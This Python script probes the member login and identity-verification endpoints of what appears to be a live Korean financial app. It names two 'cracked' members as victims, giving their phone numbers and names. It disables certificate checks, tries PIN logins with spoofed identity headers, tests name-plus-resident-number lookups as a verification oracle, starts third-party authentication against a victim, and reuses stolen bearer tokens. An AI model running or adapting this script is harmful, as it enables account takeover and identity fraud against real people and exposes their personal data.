#!/usr/bin/env python3
"""Empirical probes of the member auth/callback surface.

Targets (all from openapi_v3, auth walls unknown):
  login-pin?pinNumber=          <- PIN-only login? what binds identity?
  check-mobile-confirm?telNo=   <- all params optional: state leak by phone?
  check-nice-UsrAuth?cstNm&rrNo <- name+RRN verification oracle (response shape)
  check-kcb-forge?txSeqNo=      <- txSeqNo predictability
  check-toss-confirm-result?txId<- txId predictability
  check-toss {victim}           <- initiates Toss auth to a KNOWN cracked member

Journal: callback_probe_log.jsonl. ~25 requests, 0.5s pace, no retries.
Victims limited to cracked members (01040039341 여동수 / 01040062401 김영란).
"""
import json
import os
import ssl
import time
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = "https://m.okbigyo.com:9443/bigyo"
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
PACE = 0.5
BUDGET = [28]
LOGF = os.path.join(HERE, "callback_probe_log.jsonl")

VICTIM_MOBILE = "01040039341"
VICTIM_NAME = "여동수"


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def req(method, path, payload=None, extra_hdrs=None):
    if BUDGET[0] <= 0:
        return None, '{"budget":"exhausted"}'
    BUDGET[0] -= 1
    url = BASE + path
    data = json.dumps(payload).encode() if payload is not None else None
    hdrs = {"User-Agent": UA, "Content-Type": "application/json"}
    if extra_hdrs:
        hdrs.update(extra_hdrs)
    rq = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(rq, timeout=15, context=CTX) as r:
            body, status = r.read().decode("utf-8", "replace"), r.status
    except urllib.error.HTTPError as e:
        body, status = e.read().decode("utf-8", "replace"), e.code
    except Exception as e:
        body, status = repr(e)[:200], None
    with open(LOGF, "a", encoding="utf-8") as f:
        f.write(json.dumps({"ts": int(time.time()), "m": method, "p": path,
                            "req": payload, "hdrs": extra_hdrs, "http": status,
                            "body": body[:3000]}, ensure_ascii=False) + "\n")
    return status, body


def main():
    log("CALLBACK PROBE START")
    tests = [
        ("POST", "/api/auth/login-pin?pinNumber=121212", None, None),
        ("POST", "/api/auth/login-pin?pinNumber=121212", None,
         {"Cookie": "mobile=" + VICTIM_MOBILE}),
        ("POST", "/api/auth/login-pin?pinNumber=121212", None,
         {"X-Mobile": VICTIM_MOBILE, "deviceId": "probe-dev-0001"}),
        ("POST", "/api/auth/check-mobile-confirm?telNo=" + VICTIM_MOBILE, None, None),
        ("POST", "/api/auth/check-mobile-confirm?telNo=" + VICTIM_MOBILE + "&txSeqNo=1&confirmValue=x", None, None),
        ("POST", "/api/auth/check-mobile-confirm?telNo=" + VICTIM_MOBILE + "&txSeqNo=1001&confirmValue=", None, None),
        ("POST", "/api/auth/check-pin?pinNumber=121212&mobile=" + VICTIM_MOBILE, None, None),
        ("POST", "/api/auth/check-pin?pinNumber=121212", None, None),
        ("POST", "/api/auth/check-nice-UsrAuth?cstNm=%EC%9C%A0%EB%8F%99%EC%88%98&rrNo=0000000000000", None, None),
        ("POST", "/api/auth/check-kcb-forge?txSeqNo=1", None, None),
        ("POST", "/api/auth/check-kcb-forge?txSeqNo=1001", None, None),
        ("POST", "/api/auth/check-toss-confirm-result?txId=probe-tx-0001", None, None),
        ("POST", "/api/auth/check-toss-confirm-status?txId=probe-tx-0001", None, None),
        ("POST", "/api/auth/check-toss",
         {"mobile": VICTIM_MOBILE, "name": VICTIM_NAME, "birthday": "19860101",
          "successCallbackUrl": "okbigyo://success", "failCallbackUrl": "okbigyo://fail",
          "flowType": "CREDIT"}, None),
    ]
    for m, p, pl, eh in tests:
        st, body = req(m, p, pl, eh)
        log(f"{m} {p[:95]} -> http={st} {body[:200]}")
        time.sleep(PACE)

    # Nice-UsrAuth WITH member token: is it an online name+RRN verify oracle?
    # Differentials: own-name/bogus-RRN vs own-name/wrong-bday-RRN vs alien-name.
    try:
        import tokstore
        creds = tokstore.load()
        if creds:
            c = creds[0]
            tok_hdr = {"Authorization": "Bearer " + c["token"]}
            nm = urllib.parse.quote(c.get("name") or VICTIM_NAME)
            nice_tests = [
                f"/api/auth/check-nice-UsrAuth?cstNm={nm}&rrNo=7711021000001",
                f"/api/auth/check-nice-UsrAuth?cstNm={nm}&rrNo=7711022000001",
                f"/api/auth/check-nice-UsrAuth?cstNm={urllib.parse.quote('김테스트')}&rrNo=7711021000001",
            ]
            for p in nice_tests:
                st, body = req("POST", p, None, tok_hdr)
                log(f"NICE+TOK {p[:95]} -> http={st} {body[:200]}")
                time.sleep(PACE)
    except Exception as e:
        log(f"NICE+TOK skipped: {repr(e)[:120]}")
    log(f"CALLBACK PROBE DONE budget_left={BUDGET[0]}")


if __name__ == "__main__":
    main()
